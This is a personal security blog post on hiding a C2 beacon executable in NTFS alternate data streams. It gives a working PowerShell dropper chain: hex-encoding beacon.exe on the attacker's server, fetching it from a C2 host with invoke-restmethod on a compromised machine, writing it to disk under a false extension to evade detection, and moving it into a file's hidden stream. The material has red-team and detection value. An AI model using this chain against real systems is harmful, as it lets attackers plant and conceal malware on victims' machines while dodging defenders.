---
layout: post
title: Hiding In Alternate Data Streams
date: '2022-05-05T11:20:00.003-07:00'
author: Matt C
tags: 
modified_time: '2022-05-06T11:04:02.299-07:00'
thumbnail: https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAdBFxzEa6GTo9pkmCysPFVExLsD6HjQH_RNrZGSEYLV-bqD4MSD2CEZqgtuIzp-1U4Hxdyx4eNp72KNSFUcd-cKQhkagtveEaWzBdGuAXcqQHwWDJ5xlhIPQKVzwQSO3wO2vM1rD-aHCWw8Bn4EmZX9NV8jwjZV2ywbmmvSSCYRByTY5QFYkBX2QU8A/s72-w551-c-h239/zone-identifier.png
blogger_id: tag:blogger.com,1999:blog-8951407132095927802.post-2004630790233384821
blogger_orig_url: https://cr.culbertreport.com/2022/05/hiding-in-alternate-data-streams.html
---

<p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>While reading Gray Hat Python, I came across another interesting tactic of hiding files in what's known as alternate data streams. I had previously seen this used by Microsoft to tag files downloaded from the internet with MOTW in the Zone.Identifier so that macros don't execute, and I've seen it used to hide simple txt files inside of another.</span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-family: arial;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAdBFxzEa6GTo9pkmCysPFVExLsD6HjQH_RNrZGSEYLV-bqD4MSD2CEZqgtuIzp-1U4Hxdyx4eNp72KNSFUcd-cKQhkagtveEaWzBdGuAXcqQHwWDJ5xlhIPQKVzwQSO3wO2vM1rD-aHCWw8Bn4EmZX9NV8jwjZV2ywbmmvSSCYRByTY5QFYkBX2QU8A/s761/zone-identifier.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="330" data-original-width="761" height="239" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAdBFxzEa6GTo9pkmCysPFVExLsD6HjQH_RNrZGSEYLV-bqD4MSD2CEZqgtuIzp-1U4Hxdyx4eNp72KNSFUcd-cKQhkagtveEaWzBdGuAXcqQHwWDJ5xlhIPQKVzwQSO3wO2vM1rD-aHCWw8Bn4EmZX9NV8jwjZV2ywbmmvSSCYRByTY5QFYkBX2QU8A/w551-h239/zone-identifier.png" width="551" /></a></span></div><p><span style="font-family: arial;"><span>&nbsp;&nbsp;&nbsp; </span>Gray Hat Python though was using an ADS to hide a full on executable. This seemed like a nifty way to bypass detection since it didn't change the file hash but I had trouble maintaining the ADS when copying the file to another victim machine. This is a common issue. The workaround that I came up with was to convert the executable that I want to hide into bytecode, serve it on a simple HTTP server, then have the victim machine write the code to disk in an invalid format to evade detection before moving it into an ADS. I found <a href="https://stackoverflow.com/questions/66300680/convert-exe-to-hexdump-with-powershell" rel="nofollow" target="_blank">a handy tip on Stackoverflow</a> to do just this.&nbsp;</span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>First up, on our C2, we must get the bytes content of our executable.<br /></span></p><p><span style="font-family: courier;"><span style="font-size: medium;"><span>[byte[]]$data = [System.IO.File]::ReadAllBytes('.\Desktop\beacon.exe')&nbsp;</span></span></span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>Then, we write the contents of this data to index.html intending to serve this with Pythons simple HTTP server.</span></p><p><span style="font-family: arial;"><span style="font-family: courier;"><span style="font-size: medium;"><span>[System.IO.File]::WriteAllText('index.html',[System.BitConverter]::ToString($data).Replace('-',''), [System.Text.Encoding]::ASCII)</span></span></span><br /></span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>After this, just ensure port 8000 is accessible on your machine and start your Python server in the same directory.<br /></span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>Now, on our compromised host, the dropper script.<br /></span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>Our dropper first runs invoke-restmethod which, similar to invoke-webrequest, does a GET to a webpage but only retrieves the content and not the meta data or anything else. A cool feature as well of restmethod is that it will automatically parse any Json retrieved.<br /></span></p><p><span style="font-family: courier;"><span style="font-size: medium;"><span>invoke-restmethod 'http://c2.culbertreport.com:8000' | Tee-Object -Variable hex</span></span></span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>Then, once we have the hex downloaded, we write it to disk with an invalid file extension. This is just to help it evade detection before we move it into an ADS.</span></p><p><span style="font-family: arial;"><span style="font-size: medium;"><span style="font-family: courier;"><span><span>[System.IO.File]::WriteAllBytes('C:\users\public\ht.html', ($hex -split '(.{2})' -ne '' -replace '^', '0X')) </span></span></span></span><br /></span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>After it's been written to disk, we then move it into a files alternate data stream and finally give it a valid file extension of .exe.&nbsp;</span></p><p><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>To do this, the first attempt used a Python script taken from Gray Hat Python. But we should be able to accomplish the same thing with Powershell. There are many sources I found that were adding data to an ADS, but they all were along the lines of <span style="font-family: courier;"><span>type beacon.exe &gt; filepath\goodfile.txt:beacon.exe</span></span>. This was causing issues because now Powershell <a href="https://stackoverflow.com/questions/62982408/powershell-the-given-paths-format-is-not-supported" rel="nofollow" target="_blank">only expects one semicolon in the path</a>. I found <a href="https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams/" rel="nofollow" target="_blank">this source </a>which was adding calc.exe to an ADS. So, following along and using Set-Content, we can add the bytestream of our downloaded file to an ADS:</span></p><p><span style="font-family: arial;"><span><span style="font-family: courier;">set-content -path .\newfile.txt -value $(Get-Content ht.html -readcount 0 -encoding byte) -encoding byte -stream beacon.exe </span><br /></span></span></p><p><span style="font-family: arial;"><span><span><span style="font-size: large;"><span>&nbsp;&nbsp; &nbsp;</span>And finally, we have it working!</span></span></span></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-family: arial;"><span style="font-size: large;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHyTgErBUb2um_Js4DXD3AYf6RNzO2NZJmT2ahaBynRzm19rl7uKsYakqtiganjzJvYhBcvyh8OfaEK5nkyv-4yjGUpuUGdbrpUXpqlbAUI2mUe8lF0LupZIpI98u84xA364AsK3_xrAh4pmGBsu7yxAwTo1iitLq1hDXCI605_YgaocBsoql83RYLgQ/s375/working.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="41" data-original-width="375" height="56" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHyTgErBUb2um_Js4DXD3AYf6RNzO2NZJmT2ahaBynRzm19rl7uKsYakqtiganjzJvYhBcvyh8OfaEK5nkyv-4yjGUpuUGdbrpUXpqlbAUI2mUe8lF0LupZIpI98u84xA364AsK3_xrAh4pmGBsu7yxAwTo1iitLq1hDXCI605_YgaocBsoql83RYLgQ/w512-h56/working.png" width="512" /></a></span></span></div><span style="font-family: arial;"><span>&nbsp;&nbsp; &nbsp;</span>These streams can be found using the Get-Item command.<br /></span><div class="separator" style="clear: both; text-align: center;"><span style="font-family: arial;"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4LIKNYawprBJmkxAiKVD9e1PyDWyuDID4iXVOmASNLyp92yB9v6AHfnurDPx74WR01feS_lRWnskqM02PC9Lt8I374vFvIOPeFu4OJs6o6GEI5BsTbf1H_ueltN1k1WiR6ebhBZFB_-hFMM-V8pqi6MnZQCKUpXV6kdX9r-ODhmKYTQS25wEwSHSs5A/s731/get-item.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="321" data-original-width="731" height="253" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4LIKNYawprBJmkxAiKVD9e1PyDWyuDID4iXVOmASNLyp92yB9v6AHfnurDPx74WR01feS_lRWnskqM02PC9Lt8I374vFvIOPeFu4OJs6o6GEI5BsTbf1H_ueltN1k1WiR6ebhBZFB_-hFMM-V8pqi6MnZQCKUpXV6kdX9r-ODhmKYTQS25wEwSHSs5A/w573-h253/get-item.png" width="573" /></a></span></span></div><span style="font-family: arial;"><span><br /></span><br /></span><div class="separator" style="clear: both; text-align: center;"></div><p></p>